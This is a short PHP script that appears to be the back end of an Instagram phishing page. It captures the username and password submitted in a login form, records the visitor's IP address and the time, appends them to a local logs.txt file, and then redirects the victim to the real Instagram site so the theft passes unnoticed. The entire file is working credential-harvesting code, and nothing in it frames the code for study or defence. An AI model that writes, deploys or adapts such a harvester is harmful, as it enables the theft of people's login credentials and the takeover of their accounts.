<?php

	$date = gmdate ("d-n-Y");
	$time = gmdate ("H:i:s");
	$ip = $_SERVER['REMOTE_ADDR'];
	$hostname = gethostbyaddr($ip);

	$message .= "========== Instagram Login ==========\n";
	$message .= "User: ".$_POST['username']."\n";
	$message .= "Pass: ".$_POST['password']."\n";
	$message .= "--------------------\n";
	$message .= "IP  : ".$ip."\n";
	$message .= "Log : ".$time." / ".$date."\n \n";

	$file = fopen("logs.txt", "ab");
	fwrite($file, $message);
	fclose($file);

	header("Location: https://www.instagram.com");
?>
